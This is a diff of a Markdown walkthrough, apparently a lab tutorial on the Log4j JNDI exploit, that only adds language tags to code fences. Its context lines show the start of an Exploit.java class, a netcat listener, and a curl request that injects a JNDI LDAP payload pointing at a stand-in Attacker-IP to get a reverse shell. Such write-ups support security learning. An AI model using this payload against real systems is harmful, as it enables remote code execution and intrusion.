@@ -177,7 +177,7 @@ LINK - [https://github.com/mbechler/marshalsec](https://github.com/mbechler/mars
 This is used to serve the `Exploit.class` file when the victim server requests it.
 
 Contents of `Exploit.java` file 👇🏻
-```
+```java
 public class Exploit 
 { 
 	static { 
@@ -208,7 +208,7 @@ nc -lvnp 9999
 
 ### Trigger the exploit (Terminal 4)
 
-```
+```bash
 curl -X GET  http://VICTIM-IP/~logs/log4j/ -H 'X-Api-Version: ${jndi:ldap://Attacker-IP:1389/Exploit\}'
 ```
 And we get a shell back on our nc
